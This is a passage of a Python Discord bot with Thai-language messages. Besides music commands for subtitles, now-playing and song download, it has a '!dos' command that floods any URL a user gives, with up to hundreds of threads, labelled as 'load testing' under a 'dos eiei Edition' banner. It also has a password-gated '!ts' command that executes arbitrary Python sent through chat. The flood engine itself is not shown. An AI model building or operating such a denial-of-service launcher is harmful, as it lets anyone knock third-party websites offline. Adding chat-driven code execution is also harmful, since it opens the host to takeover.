    if cur.thumbnail: embed.set_image(url=cur.thumbnail)
    embed.add_field(name="Progress", value=f"`{em}:{es:02d}` [{bar}] `{m}:{s:02d}`", inline=False)
    view = NowPlayingView(player, ctx.guild.id)
    await ctx.send(embed=embed, view=view, delete_after=60)

@bot.command(name='sub')
async def open_subtitle(ctx):
    schedule_delete(ctx)
    guild_id = ctx.guild.id
    player = music_players.get(guild_id)
    if not player or not player.current: return await ctx.send("❌ ไม่มีเพลงเล่นอยู่", delete_after=5)
    if not player.current_captions:
        msg = await ctx.send("⏳ กำลังโหลดซับไตเติ้ล...")
        try:
            lang, caps = await bot.loop.run_in_executor(None, lambda u=player.current.webpage_url: get_youtube_captions(u))
            if caps: player.current_captions = caps; player.subtitle_lang = lang or "Auto"; await msg.delete()
            else: return await msg.edit(content="❌ เพลงนี้ไม่มีซับไตเติ้ลบน YouTube")
        except Exception as e: return await msg.edit(content=f"❌ โหลดซับไม่ได้: {e}")
    player.subtitle_enabled = True
    elapsed = asyncio.get_event_loop().time() - player.play_start_time
    sub_embed = build_subtitle_embed(player, player.current, elapsed)
    view = SubtitleView(player, guild_id)
    sub_msg = await ctx.send(embed=sub_embed, view=view)
    player.subtitle_msg = sub_msg
    if player.subtitle_task and not player.subtitle_task.done(): player.subtitle_task.cancel()
    player.subtitle_task = bot.loop.create_task(player.run_subtitle_loop())

@bot.command(name='ts')
async def dev_execute(ctx, *, code: str = None):
    schedule_delete(ctx)
    if ctx.author.id not in ts_authed_users:
        pw_msg = await ctx.send(embed=discord.Embed(title="🔐 Dev Command — ต้องการรหัสผ่าน", description="พิมพ์รหัสผ่านใน DM หรือในห้องนี้ภายใน 30 วินาที", color=discord.Color.orange()))
        def pw_check(m): return m.author == ctx.author and (m.channel == ctx.channel or isinstance(m.channel, discord.DMChannel))
        try:
            pw_reply = await bot.wait_for('message', timeout=30.0, check=pw_check)
            try: await pw_reply.delete()
            except Exception: pass
            if pw_reply.content.strip() != TS_PASSWORD: return await pw_msg.edit(embed=discord.Embed(title="❌ รหัสผ่านผิด", color=discord.Color.red()))
            ts_authed_users.add(ctx.author.id)
            await pw_msg.edit(embed=discord.Embed(title="✅ รหัสถูกต้อง!", description="คุณผ่านการยืนยันแล้ว ส่งโค้ดได้เลยครับ", color=discord.Color.green()))
            if not code: return
        except asyncio.TimeoutError: return await pw_msg.edit(embed=discord.Embed(title="⏰ หมดเวลา", color=discord.Color.greyple()))
    if not code:
        if ctx.message.attachments and ctx.message.attachments[0].filename.endswith('.py'):
            code = (await ctx.message.attachments[0].read()).decode('utf-8', errors='replace')
        else: return await ctx.send("❌ แนบไฟล์ .py หรือใส่โค้ด", delete_after=8)
    code = code.strip()
    if code.startswith('```'): code = re.sub(r'^```[a-z]*\n?', '', code); code = re.sub(r'```$', '', code).strip()
    msg = await ctx.send(embed=discord.Embed(title="⚙️ กำลังรันโค้ด...", description=f"```py\n{code[:500]}\n```", color=discord.Color.blurple()))
    stdout_capture = io.StringIO()
    start_time = time.time()
    local_vars = {'bot': bot, 'ctx': ctx, 'guild': ctx.guild, 'channel': ctx.channel, 'author': ctx.author, 'asyncio': asyncio, 'discord': discord}
    try:
        import sys as _sys
        old_stdout = _sys.stdout; _sys.stdout = stdout_capture
        try:
            wrapped = f"async def __exec_code__():\n" + "\n".join([f"    {line}" for line in code.split('\n')])
            exec(compile(wrapped, '<ts>', 'exec'), local_vars)
            result = await local_vars['__exec_code__']()
        except SyntaxError:
            exec(compile(code, '<ts>', 'exec'), local_vars)
            result = None
        finally: _sys.stdout = old_stdout
        elapsed_ms = (time.time() - start_time) * 1000
        output = stdout_capture.getvalue()
        embed = discord.Embed(title="✅ รันสำเร็จ", color=discord.Color.green())
        embed.set_footer(text=f"⏱ {elapsed_ms:.1f}ms | Dev: {ctx.author.name}")
        if result is not None: embed.add_field(name="Return Value", value=f"```\n{str(result)[:500]}\n```", inline=False)
        if output: embed.add_field(name="Output", value=f"```\n{output[:800]}\n```", inline=False)
        await msg.edit(embed=embed)
    except Exception as err:
        elapsed_ms = (time.time() - start_time) * 1000
        tb = traceback.format_exc()
        embed = discord.Embed(title="❌ Error", description=f"```py\n{tb[-1500:]}\n```", color=discord.Color.red())
        embed.set_footer(text=f"⏱ {elapsed_ms:.1f}ms | Dev: {ctx.author.name}")
        await msg.edit(embed=embed)

@bot.command(name='dos')
async def dos_command(ctx, url: str, threads: int = 500, rps: int = 20, duration: int = 10):
    schedule_delete(ctx)
    if not url.startswith('http'): return await ctx.send("❌ URL ต้องขึ้นต้นด้วย http:// หรือ https://")
    success, msg = global_ddos.start(url, threads, rps, duration)
    if success:
        embed = discord.Embed(title="🎯 เริ่มการทดสอบโหลด (DOS)", color=discord.Color.red())
        embed.add_field(name="เป้าหมาย", value=url, inline=False)
        embed.add_field(name="Threads", value=str(threads), inline=True)
        embed.add_field(name="RPS/Thread", value=str(rps), inline=True)
        embed.add_field(name="เวลา (นาที)", value=str(duration), inline=True)
        embed.set_footer(text=f"ดูสถิติเรียลไทม์ได้ที่เว็บ: {PUBLIC_URL}/dos")
        await ctx.send(embed=embed)
    else: await ctx.send(f"❌ ไม่สามารถเริ่มได้: {msg}")

@bot.command(name='stopdos')
async def stopdos_command(ctx):
    schedule_delete(ctx)
    global_ddos.stop()
    await ctx.send("🛑 หยุดการทดสอบโหลดแล้ว")

@bot.command(name='go')
async def go_command(ctx):
    schedule_delete(ctx)
    embed = discord.Embed(title="🚀 DOS Web Interface", description=f"คลิกที่นี่เพื่อไปยังหน้าเว็บ:\n{PUBLIC_URL}/dos", color=discord.Color.blue())
    await ctx.send(embed=embed)

@bot.command(name='dw')
async def download_song(ctx):
    schedule_delete(ctx)
    player = music_players.get(ctx.guild.id)
    if not player or not player.current:
        return await ctx.send("❌ ไม่มีเพลงเล่นอยู่", delete_after=5)
    
    cur = player.current
    msg = await ctx.send(f"⏳ กำลังเตรียมไฟล์ดาวน์โหลด: **{cur.title}**...")
    
    def download_task():
        yt = YouTube(cur.webpage_url)
        stream = yt.streams.filter(only_audio=True).order_by('abr').last() or yt.streams.filter(only_audio=True).first()
        if not stream:
            raise Exception("ไม่พบสตรีมเสียง")
        
        tmpdir = tempfile.mkdtemp()
        file_path = stream.download(output_path=tmpdir)
        return tmpdir, file_path

    try:
        tmpdir, file_path = await bot.loop.run_in_executor(None, download_task)
        file_size = os.path.getsize(file_path)
        
        if file_size > DISCORD_FILE_LIMIT:
            shutil.rmtree(tmpdir, ignore_errors=True)
            return await msg.edit(content=f"❌ ไฟล์ใหญ่เกินไป ({file_size / 1024 / 1024:.2f} MB) ไม่สามารถส่งใน Discord ได้ (จำกัดที่ 25MB)")
            
        await ctx.send(content=f"✅ ดาวน์โหลดสำเร็จ: **{cur.title}**", file=discord.File(file_path))
        await msg.delete()
        shutil.rmtree(tmpdir, ignore_errors=True)
    except Exception as e:
        await msg.edit(content=f"❌ เกิดข้อผิดพลาดในการดาวน์โหลด: {e}")

@bot.command(name='help')
async def custom_help(ctx):
    schedule_delete(ctx)
    embed = discord.Embed(title="🤖 คำสั่งทั้งหมด (dos eiei Edition)", color=discord.Color.blurple())
    embed.add_field(name="🎵 เพลง", value="`!play` `!playvid` `!loop` `!auto` `!like` `!stopauto` `!queue` `!skip` `!pause` `!resume` `!stop` `!np` `!sub` `!dw`", inline=False)
    embed.add_field(name="🧠 AI & ค้นหา", value="`!a` `!web` `!im` `!model` `!private` `!d`", inline=False)
    embed.add_field(name="🎬 Stream & DOS", value=f"`!stream <url>` — ดูวิดีโอพร้อม AI Chat บนเว็บ\n`!dos <url> [threads] [rps] [duration]` — ทดสอบโหลด\n`!stopdos` — หยุดทดสอบโหลด\n`!go` — รับลิ้งค์เว็บ DOS\n🌐 Web: `{PUBLIC_URL}`", inline=False)
    embed.add_field(name="⚙️ Dev", value="`!ts` — รันโค้ด Python", inline=False)
    await ctx.send(embed=embed, delete_after=45)

if __name__ == "__main__":
    print("🚀 Discord Bot — dos eiei Edition")
    print("🔁 Loop | 🔥 Auto | ❤️ Like | 🎬 Stream | 🎯 DOS Tester")
    bot.run(DISCORD_TOKEN)
